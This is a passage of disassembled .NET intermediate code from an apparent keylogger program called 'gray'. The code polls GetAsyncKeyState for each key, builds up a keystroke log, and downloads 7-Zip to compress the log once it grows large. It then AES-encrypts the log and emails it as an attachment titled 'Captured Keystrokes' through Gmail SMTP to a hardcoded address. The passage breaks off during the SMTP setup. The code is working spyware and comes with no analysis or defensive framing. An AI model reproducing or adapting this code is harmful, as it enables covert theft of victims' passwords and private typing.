    IL_06ca:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_06cf:  ldc.i4.0
    IL_06d0:  cgt.un
    IL_06d2:  brfalse.s  IL_06f9

    IL_06d4:  ldloc.1
    IL_06d5:  brfalse.s  IL_06e8

    IL_06d7:  ldloc.3
    IL_06d8:  ldstr      "*"
    IL_06dd:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_06e2:  stloc.3
    IL_06e3:  br         IL_0a97

    IL_06e8:  ldloc.3
    IL_06e9:  ldstr      "8"
    IL_06ee:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_06f3:  stloc.3
    IL_06f4:  br         IL_0a97

    IL_06f9:  ldc.i4.s   57
    IL_06fb:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0700:  ldc.i4.0
    IL_0701:  cgt.un
    IL_0703:  brfalse.s  IL_072a

    IL_0705:  ldloc.1
    IL_0706:  brfalse.s  IL_0719

    IL_0708:  ldloc.3
    IL_0709:  ldstr      "("
    IL_070e:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0713:  stloc.3
    IL_0714:  br         IL_0a97

    IL_0719:  ldloc.3
    IL_071a:  ldstr      "9"
    IL_071f:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0724:  stloc.3
    IL_0725:  br         IL_0a97

    IL_072a:  ldc.i4     0xba
    IL_072f:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0734:  ldc.i4.0
    IL_0735:  cgt.un
    IL_0737:  brfalse.s  IL_075e

    IL_0739:  ldloc.1
    IL_073a:  brfalse.s  IL_074d

    IL_073c:  ldloc.3
    IL_073d:  ldstr      ":"
    IL_0742:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0747:  stloc.3
    IL_0748:  br         IL_0a97

    IL_074d:  ldloc.3
    IL_074e:  ldstr      ";"
    IL_0753:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0758:  stloc.3
    IL_0759:  br         IL_0a97

    IL_075e:  ldc.i4     0xbb
    IL_0763:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0768:  ldc.i4.0
    IL_0769:  cgt.un
    IL_076b:  brfalse.s  IL_0792

    IL_076d:  ldloc.1
    IL_076e:  brfalse.s  IL_0781

    IL_0770:  ldloc.3
    IL_0771:  ldstr      "+"
    IL_0776:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_077b:  stloc.3
    IL_077c:  br         IL_0a97

    IL_0781:  ldloc.3
    IL_0782:  ldstr      "="
    IL_0787:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_078c:  stloc.3
    IL_078d:  br         IL_0a97

    IL_0792:  ldc.i4     0xbc
    IL_0797:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_079c:  ldc.i4.0
    IL_079d:  cgt.un
    IL_079f:  brfalse.s  IL_07c6

    IL_07a1:  ldloc.1
    IL_07a2:  brfalse.s  IL_07b5

    IL_07a4:  ldloc.3
    IL_07a5:  ldstr      "<"
    IL_07aa:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_07af:  stloc.3
    IL_07b0:  br         IL_0a97

    IL_07b5:  ldloc.3
    IL_07b6:  ldstr      ","
    IL_07bb:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_07c0:  stloc.3
    IL_07c1:  br         IL_0a97

    IL_07c6:  ldc.i4     0xbd
    IL_07cb:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_07d0:  ldc.i4.0
    IL_07d1:  cgt.un
    IL_07d3:  brfalse.s  IL_07fa

    IL_07d5:  ldloc.1
    IL_07d6:  brfalse.s  IL_07e9

    IL_07d8:  ldloc.3
    IL_07d9:  ldstr      "_"
    IL_07de:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_07e3:  stloc.3
    IL_07e4:  br         IL_0a97

    IL_07e9:  ldloc.3
    IL_07ea:  ldstr      "-"
    IL_07ef:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_07f4:  stloc.3
    IL_07f5:  br         IL_0a97

    IL_07fa:  ldc.i4     0xbe
    IL_07ff:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0804:  ldc.i4.0
    IL_0805:  cgt.un
    IL_0807:  brfalse.s  IL_082e

    IL_0809:  ldloc.1
    IL_080a:  brfalse.s  IL_081d

    IL_080c:  ldloc.3
    IL_080d:  ldstr      ">"
    IL_0812:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0817:  stloc.3
    IL_0818:  br         IL_0a97

    IL_081d:  ldloc.3
    IL_081e:  ldstr      "."
    IL_0823:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0828:  stloc.3
    IL_0829:  br         IL_0a97

    IL_082e:  ldc.i4     0xbf
    IL_0833:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0838:  ldc.i4.0
    IL_0839:  cgt.un
    IL_083b:  brfalse.s  IL_0862

    IL_083d:  ldloc.1
    IL_083e:  brfalse.s  IL_0851

    IL_0840:  ldloc.3
    IL_0841:  ldstr      "\?"
    IL_0846:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_084b:  stloc.3
    IL_084c:  br         IL_0a97

    IL_0851:  ldloc.3
    IL_0852:  ldstr      "/"
    IL_0857:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_085c:  stloc.3
    IL_085d:  br         IL_0a97

    IL_0862:  ldc.i4     0xdc
    IL_0867:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_086c:  ldc.i4.0
    IL_086d:  cgt.un
    IL_086f:  brfalse.s  IL_0896

    IL_0871:  ldloc.1
    IL_0872:  brfalse.s  IL_0885

    IL_0874:  ldloc.3
    IL_0875:  ldstr      "|"
    IL_087a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_087f:  stloc.3
    IL_0880:  br         IL_0a97

    IL_0885:  ldloc.3
    IL_0886:  ldstr      "\\"
    IL_088b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0890:  stloc.3
    IL_0891:  br         IL_0a97

    IL_0896:  ldc.i4     0xdd
    IL_089b:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_08a0:  ldc.i4.0
    IL_08a1:  cgt.un
    IL_08a3:  brfalse.s  IL_08ca

    IL_08a5:  ldloc.1
    IL_08a6:  brfalse.s  IL_08b9

    IL_08a8:  ldloc.3
    IL_08a9:  ldstr      "}"
    IL_08ae:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_08b3:  stloc.3
    IL_08b4:  br         IL_0a97

    IL_08b9:  ldloc.3
    IL_08ba:  ldstr      "]"
    IL_08bf:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_08c4:  stloc.3
    IL_08c5:  br         IL_0a97

    IL_08ca:  ldc.i4     0xdb
    IL_08cf:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_08d4:  ldc.i4.0
    IL_08d5:  cgt.un
    IL_08d7:  brfalse.s  IL_08fe

    IL_08d9:  ldloc.1
    IL_08da:  brfalse.s  IL_08ed

    IL_08dc:  ldloc.3
    IL_08dd:  ldstr      "{"
    IL_08e2:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_08e7:  stloc.3
    IL_08e8:  br         IL_0a97

    IL_08ed:  ldloc.3
    IL_08ee:  ldstr      "["
    IL_08f3:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_08f8:  stloc.3
    IL_08f9:  br         IL_0a97

    IL_08fe:  ldc.i4     0xde
    IL_0903:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0908:  ldc.i4.0
    IL_0909:  cgt.un
    IL_090b:  brfalse.s  IL_0932

    IL_090d:  ldloc.1
    IL_090e:  brfalse.s  IL_0921

    IL_0910:  ldloc.3
    IL_0911:  ldstr      "\""
    IL_0916:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_091b:  stloc.3
    IL_091c:  br         IL_0a97

    IL_0921:  ldloc.3
    IL_0922:  ldstr      "'"
    IL_0927:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_092c:  stloc.3
    IL_092d:  br         IL_0a97

    IL_0932:  ldc.i4.s   13
    IL_0934:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0939:  ldc.i4.0
    IL_093a:  cgt.un
    IL_093c:  brfalse.s  IL_094f

    IL_093e:  ldloc.3
    IL_093f:  ldstr      "\r\n"
    IL_0944:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0949:  stloc.3
    IL_094a:  br         IL_0a97

    IL_094f:  ldc.i4.s   32
    IL_0951:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0956:  ldc.i4.0
    IL_0957:  cgt.un
    IL_0959:  brfalse.s  IL_096c

    IL_095b:  ldloc.3
    IL_095c:  ldstr      " "
    IL_0961:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0966:  stloc.3
    IL_0967:  br         IL_0a97

    IL_096c:  ldc.i4.s   37
    IL_096e:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0973:  ldc.i4.0
    IL_0974:  cgt.un
    IL_0976:  brfalse.s  IL_0989

    IL_0978:  ldloc.3
    IL_0979:  ldstr      bytearray (90 21 )                                           // .!
    IL_097e:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0983:  stloc.3
    IL_0984:  br         IL_0a97

    IL_0989:  ldc.i4.s   38
    IL_098b:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_0990:  ldc.i4.0
    IL_0991:  cgt.un
    IL_0993:  brfalse.s  IL_09a6

    IL_0995:  ldloc.3
    IL_0996:  ldstr      bytearray (91 21 )                                           // .!
    IL_099b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_09a0:  stloc.3
    IL_09a1:  br         IL_0a97

    IL_09a6:  ldc.i4.s   39
    IL_09a8:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_09ad:  ldc.i4.0
    IL_09ae:  cgt.un
    IL_09b0:  brfalse.s  IL_09c3

    IL_09b2:  ldloc.3
    IL_09b3:  ldstr      bytearray (92 21 )                                           // .!
    IL_09b8:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_09bd:  stloc.3
    IL_09be:  br         IL_0a97

    IL_09c3:  ldc.i4.s   40
    IL_09c5:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_09ca:  ldc.i4.0
    IL_09cb:  cgt.un
    IL_09cd:  brfalse.s  IL_09e0

    IL_09cf:  ldloc.3
    IL_09d0:  ldstr      bytearray (93 21 )                                           // .!
    IL_09d5:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_09da:  stloc.3
    IL_09db:  br         IL_0a97

    IL_09e0:  ldc.i4.8
    IL_09e1:  call       int16 gray.Form1::GetAsyncKeyState(int32)
    IL_09e6:  ldc.i4.0
    IL_09e7:  cgt.un
    IL_09e9:  brfalse    IL_0a97

    IL_09ee:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_09f3:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_09f8:  ldloc.0
    IL_09f9:  ldarg.0
    IL_09fa:  ldfld      object gray.Form1::i
    IL_09ff:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0a04:  ldstr      ".txt"
    IL_0a09:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0a0e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0a13:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::FileExists(string)
    IL_0a18:  brfalse.s  IL_0a8c

    IL_0a1a:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0a1f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0a24:  ldloc.0
    IL_0a25:  ldarg.0
    IL_0a26:  ldfld      object gray.Form1::i
    IL_0a2b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0a30:  ldstr      ".txt"
    IL_0a35:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0a3a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0a3f:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::ReadAllText(string)
    IL_0a44:  stloc.s    V_4
    IL_0a46:  ldloc.s    V_4
    IL_0a48:  ldnull
    IL_0a49:  ldc.i4.0
    IL_0a4a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0a4f:  brfalse.s  IL_0a8c

    IL_0a51:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0a56:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0a5b:  ldloc.0
    IL_0a5c:  ldarg.0
    IL_0a5d:  ldfld      object gray.Form1::i
    IL_0a62:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0a67:  ldstr      ".txt"
    IL_0a6c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0a71:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0a76:  ldloc.s    V_4
    IL_0a78:  ldloc.s    V_4
    IL_0a7a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Len(string)
    IL_0a7f:  ldc.i4.1
    IL_0a80:  sub
    IL_0a81:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Left(string,
                                                                                           int32)
    IL_0a86:  ldc.i4.0
    IL_0a87:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::WriteAllText(string,
                                                                                                                             string,
                                                                                                                             bool)
    IL_0a8c:  ldloc.3
    IL_0a8d:  dup
    IL_0a8e:  brtrue.s   IL_0a96

    IL_0a90:  pop
    IL_0a91:  ldstr      ""
    IL_0a96:  stloc.3
    IL_0a97:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0a9c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_0aa1:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
    IL_0aa6:  ldc.i4.0
    IL_0aa7:  ceq
    IL_0aa9:  ldloc.3
    IL_0aaa:  ldnull
    IL_0aab:  ldc.i4.0
    IL_0aac:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0ab1:  ldc.i4.0
    IL_0ab2:  cgt.un
    IL_0ab4:  and
    IL_0ab5:  brfalse    IL_0e24

    IL_0aba:  ldloc.0
    IL_0abb:  ldarg.0
    IL_0abc:  ldfld      object gray.Form1::i
    IL_0ac1:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0ac6:  ldstr      ".txt"
    IL_0acb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0ad0:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0ad5:  stloc.s    V_5
    IL_0ad7:  ldstr      "51000000"
    IL_0adc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_0ae1:  stloc.s    V_6
    IL_0ae3:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0ae8:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0aed:  ldloc.s    V_5
    IL_0aef:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::FileExists(string)
    IL_0af4:  brfalse    IL_0e11

    IL_0af9:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0afe:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0b03:  ldloc.s    V_5
    IL_0b05:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::ReadAllText(string)
    IL_0b0a:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0b0f:  ldloc.s    V_6
    IL_0b11:  ble        IL_0e11

    IL_0b16:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0b1b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0b20:  ldloc.0
    IL_0b21:  ldstr      "7za.exe"
    IL_0b26:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0b2b:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::FileExists(string)
    IL_0b30:  brtrue.s   IL_0b62

    IL_0b32:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0b37:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Network [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Network()
    IL_0b3c:  ldstr      "https://www.7-zip.org/a/7za920.zip"
    IL_0b41:  ldloc.0
    IL_0b42:  ldstr      "7za920.zip"
    IL_0b47:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0b4c:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Network::DownloadFile(string,
                                                                                                                  string)
    IL_0b51:  ldloc.0
    IL_0b52:  ldstr      "7za920.zip"
    IL_0b57:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0b5c:  ldloc.0
    IL_0b5d:  call       void [System.IO.Compression.FileSystem]System.IO.Compression.ZipFile::ExtractToDirectory(string,
                                                                                                                  string)
    IL_0b62:  ldloc.0
    IL_0b63:  ldstr      "7za.exe a -t7z -m0=lzma2 -mhe=on -mx=9 -mfb=64 -md"
    + "=32m -ms=on "
    IL_0b68:  ldloc.0
    IL_0b69:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0b6e:  ldarg.0
    IL_0b6f:  ldfld      object gray.Form1::i
    IL_0b74:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0b79:  ldstr      ".7z "
    IL_0b7e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0b83:  ldloc.s    V_5
    IL_0b85:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0b8a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0b8f:  ldc.i4.0
    IL_0b90:  ldc.i4.0
    IL_0b91:  ldc.i4.m1
    IL_0b92:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_0b97:  pop
    IL_0b98:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0b9d:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0ba2:  ldloc.0
    IL_0ba3:  ldarg.0
    IL_0ba4:  ldfld      object gray.Form1::i
    IL_0ba9:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0bae:  ldstr      ".7z"
    IL_0bb3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0bb8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0bbd:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::FileExists(string)
    IL_0bc2:  brfalse    IL_0e11

    IL_0bc7:  ldstr      ""
    IL_0bcc:  stloc.s    V_7
    IL_0bce:  newobj     instance void [mscorlib]System.Security.Cryptography.RijndaelManaged::.ctor()
    IL_0bd3:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0bd8:  ldc.i4.s   32
    IL_0bda:  newarr     [mscorlib]System.Byte
    IL_0bdf:  stloc.s    V_8
    IL_0be1:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_ASCII()
    IL_0be6:  ldloc.s    V_7
    IL_0be8:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_0bed:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_0bf2:  dup
    IL_0bf3:  ldc.i4.0
    IL_0bf4:  ldloc.s    V_8
    IL_0bf6:  ldc.i4.0
    IL_0bf7:  ldc.i4.s   16
    IL_0bf9:  call       void [mscorlib]System.Array::Copy(class [mscorlib]System.Array,
                                                           int32,
                                                           class [mscorlib]System.Array,
                                                           int32,
                                                           int32)
    IL_0bfe:  ldc.i4.0
    IL_0bff:  ldloc.s    V_8
    IL_0c01:  ldc.i4.s   15
    IL_0c03:  ldc.i4.s   16
    IL_0c05:  call       void [mscorlib]System.Array::Copy(class [mscorlib]System.Array,
                                                           int32,
                                                           class [mscorlib]System.Array,
                                                           int32,
                                                           int32)
    IL_0c0a:  dup
    IL_0c0b:  ldloc.s    V_8
    IL_0c0d:  callvirt   instance void [mscorlib]System.Security.Cryptography.SymmetricAlgorithm::set_Key(uint8[])
    IL_0c12:  dup
    IL_0c13:  ldc.i4.2
    IL_0c14:  callvirt   instance void [mscorlib]System.Security.Cryptography.SymmetricAlgorithm::set_Mode(valuetype [mscorlib]System.Security.Cryptography.CipherMode)
    IL_0c19:  callvirt   instance class [mscorlib]System.Security.Cryptography.ICryptoTransform [mscorlib]System.Security.Cryptography.SymmetricAlgorithm::CreateEncryptor()
    IL_0c1e:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0c23:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0c28:  ldloc.0
    IL_0c29:  ldarg.0
    IL_0c2a:  ldfld      object gray.Form1::i
    IL_0c2f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0c34:  ldstr      ".7z"
    IL_0c39:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0c3e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0c43:  callvirt   instance uint8[] [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::ReadAllBytes(string)
    IL_0c48:  stloc.s    V_9
    IL_0c4a:  ldloc.s    V_9
    IL_0c4c:  ldc.i4.0
    IL_0c4d:  ldloc.s    V_9
    IL_0c4f:  ldlen
    IL_0c50:  conv.i4
    IL_0c51:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.ICryptoTransform::TransformFinalBlock(uint8[],
                                                                                                                       int32,
                                                                                                                       int32)
    IL_0c56:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_0c5b:  stloc.s    V_10
    IL_0c5d:  call       class gray.My.MyComputer gray.My.MyProject::get_Computer()
    IL_0c62:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0c67:  ldloc.0
    IL_0c68:  ldstr      "aes"
    IL_0c6d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0c72:  ldarg.0
    IL_0c73:  ldfld      object gray.Form1::i
    IL_0c78:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0c7d:  ldstr      ".txt"
    IL_0c82:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0c87:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0c8c:  ldloc.s    V_10
    IL_0c8e:  ldc.i4.1
    IL_0c8f:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::WriteAllText(string,
                                                                                                                             string,
                                                                                                                             bool)
    .try
    {
      IL_0c94:  ldloc.0
      IL_0c95:  ldstr      "aes"
      IL_0c9a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0c9f:  ldarg.0
      IL_0ca0:  ldfld      object gray.Form1::i
      IL_0ca5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0caa:  ldstr      ".txt"
      IL_0caf:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0cb4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0cb9:  newobj     instance void [System]System.Net.Mail.Attachment::.ctor(string)
      IL_0cbe:  stloc.s    V_11
      .try
      {
        IL_0cc0:  newobj     instance void [System]System.Net.Mail.MailMessage::.ctor()
        IL_0cc5:  dup
        IL_0cc6:  ldstr      "Captured Keystrokes"
        IL_0ccb:  callvirt   instance void [System]System.Net.Mail.MailMessage::set_Subject(string)
        IL_0cd0:  stloc.s    V_12
        .try
        {
          IL_0cd2:  ldstr      "grayprogrammer@gmail.com"
          IL_0cd7:  stloc.s    V_13
          IL_0cd9:  ldloc.s    V_12
          IL_0cdb:  callvirt   instance class [System]System.Net.Mail.MailAddressCollection [System]System.Net.Mail.MailMessage::get_To()
          IL_0ce0:  ldloc.s    V_13
          IL_0ce2:  callvirt   instance void [System]System.Net.Mail.MailAddressCollection::Add(string)
          IL_0ce7:  ldloc.s    V_12
          IL_0ce9:  ldloc.s    V_13
          IL_0ceb:  newobj     instance void [System]System.Net.Mail.MailAddress::.ctor(string)
          IL_0cf0:  callvirt   instance void [System]System.Net.Mail.MailMessage::set_From(class [System]System.Net.Mail.MailAddress)
          IL_0cf5:  ldloc.s    V_12
          IL_0cf7:  ldstr      "These are your keylogs files."
          IL_0cfc:  callvirt   instance void [System]System.Net.Mail.MailMessage::set_Body(string)
          IL_0d01:  ldloc.s    V_12
          IL_0d03:  callvirt   instance class [System]System.Net.Mail.AttachmentCollection [System]System.Net.Mail.MailMessage::get_Attachments()
          IL_0d08:  ldloc.s    V_11
          IL_0d0a:  callvirt   instance void class [mscorlib]System.Collections.ObjectModel.Collection`1<class [System]System.Net.Mail.Attachment>::Add(!0)
          IL_0d0f:  ldstr      "smtp.gmail.com"
          IL_0d14:  newobj     instance void [System]System.Net.Mail.SmtpClient::.ctor(string)
          IL_0d19:  dup
          IL_0d1a:  ldc.i4.1
          IL_0d1b:  callvirt   instance void [System]System.Net.Mail.SmtpClient::set_EnableSsl(bool)
          IL_0d20:  dup
          IL_0d21:  ldloc.s    V_13
          IL_0d23:  ldloc.s    V_7
          IL_0d25:  newobj     instance void [System]System.Net.NetworkCredential::.ctor(string,
                                                                                         string)
          IL_0d2a:  callvirt   instance void [System]System.Net.Mail.SmtpClient::set_Credentials(class [System]System.Net.ICredentialsByHost)
          IL_0d2f:  dup
          IL_0d30:  ldstr      "587"
          IL_0d35:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
